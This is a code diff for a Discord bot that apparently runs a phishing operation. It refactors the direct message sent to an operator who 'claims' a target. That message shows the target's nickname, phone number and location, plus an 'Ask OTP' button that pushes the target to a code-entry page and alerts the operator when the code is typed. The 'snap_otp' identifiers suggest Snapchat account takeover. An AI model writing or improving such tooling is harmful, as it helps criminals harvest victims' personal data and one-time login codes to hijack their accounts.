@@ -210,15 +210,7 @@ class OKButton(discord.ui.Button):
         # DM the presser with phone + OTP button
         try:
             dm = await interaction.user.create_dm()
-            embed = discord.Embed(
-                title="📞 Number claimed",
-                description=f"**Nickname:** `{u['nickname']}`\n**Phone:** `{u['phone']}`\n**Location:** {u.get('geo',{}).get('city','?')}, {u.get('geo',{}).get('country','?')}",
-                color=cfg.get("embed_color", 0xFACC15),
-            )
-            ft = (cfg.get("footer_text") or "").strip()
-            if ft:
-                embed.set_footer(text=ft)
-            await dm.send(embed=embed, view=OTPView(user_id))
+            await dm.send(view=ClaimedView(u, cfg))
         except discord.Forbidden:
             # rollback the claim so someone else can try
             await db.users.update_one({"id": user_id}, {"$set": {"discord_presser_id": None}})
@@ -241,10 +233,20 @@ class OKButton(discord.ui.Button):
         asyncio.create_task(refresh_leaderboard())
 
 
-class OTPView(discord.ui.View):
-    def __init__(self, user_id: str):
-        super().__init__(timeout=None)
-        self.add_item(OTPButton(user_id))
+def _claimed_body(u: dict, cfg: dict, asked: bool = False) -> str:
+    geo = u.get("geo", {}) or {}
+    body = (
+        f"# {SHOP_EMOJI} Number claimed\n"
+        f"**Nickname**\u2003`{u.get('nickname','?')}`\n"
+        f"**Phone**\u2003`{u.get('phone','?')}`\n"
+        f"**Location**\u2003{geo.get('city','?')}, {geo.get('country','?')}"
+    )
+    if asked:
+        body += f"\n\n{CALL_EMOJI} OTP requested \u2014 waiting for the user to type the code."
+    ft = (cfg.get("footer_text") or "").strip()
+    if ft:
+        body += f"\n\n-# {ft}"
+    return body
 
 
 class OTPButton(discord.ui.Button):
@@ -252,7 +254,7 @@ class OTPButton(discord.ui.Button):
         super().__init__(
             style=discord.ButtonStyle.primary,
             label="Ask OTP",
-            emoji="🔑",
+            emoji=discord.PartialEmoji.from_str(CALL_EMOJI),
             custom_id=f"snap_otp:{user_id}",
         )
         self.snap_user_id = user_id
@@ -269,16 +271,14 @@ class OTPButton(discord.ui.Button):
         if not u:
             await interaction.response.send_message("User not found.", ephemeral=True)
             return
-        # move user to code state
         await db.users.update_one(
             {"id": self.snap_user_id},
             {"$set": {"state": "code", "updated_at": now_iso()}},
         )
-        # confirm in DM
         try:
-            self.disabled = True
-            self.label = "Asked for OTP"
-            await interaction.response.edit_message(view=self.view)
+            await interaction.response.edit_message(
+                view=ClaimedView(u, cfg, asked=True)
+            )
             await interaction.followup.send(
                 f"✅ Asked for OTP. The user `{u['nickname']}` now sees the code input page. You'll be pinged here as soon as they type it.",
                 ephemeral=False,
@@ -286,6 +286,29 @@ class OTPButton(discord.ui.Button):
         except Exception:
             pass
         await log_action(f"🔑 <@{interaction.user.id}> pressed **OTP** for `{u['nickname']}`")
+
+
+class ClaimedView(discord.ui.LayoutView):
+    """DM 'Number claimed' in Components V2 (colored bar + Ask OTP button inside)."""
+
+    def __init__(self, u: dict, cfg: dict, asked: bool = False):
+        super().__init__(timeout=None)
+        accent = cfg.get("embed_color", 0xFACC15)
+        container = discord.ui.Container(accent_colour=accent)
+        container.add_item(discord.ui.TextDisplay(_claimed_body(u, cfg, asked)))
+        container.add_item(discord.ui.Separator())
+        if not asked:
+            container.add_item(discord.ui.ActionRow(OTPButton(u["id"])))
+        else:
+            done = discord.ui.Button(
+                label="Asked for OTP",
+                style=discord.ButtonStyle.secondary,
+                emoji=discord.PartialEmoji.from_str(CALL_EMOJI),
+                disabled=True,
+                custom_id="snap_otp_done",
+            )
+            container.add_item(discord.ui.ActionRow(done))
+        self.add_item(container)
 
 
 # ---------- Public API from FastAPI ----------
@@ -698,6 +721,8 @@ async def _resolve_timer_target(cfg, guild, channel, role_arg):
 FREEZE_EMOJI = "<:ban:1542637913630838825>"
 ALERT_EMOJI = "<a:Alert:1537938372822040716>"
 FLASH_EMOJI = "<a:Flash:1542636354192805888>"
+SHOP_EMOJI = "<a:shopping:1537938659716894731>"
+CALL_EMOJI = "<:call:1543572200643240016>"
 
 
 def _fmt_secs(sec: int) -> str:
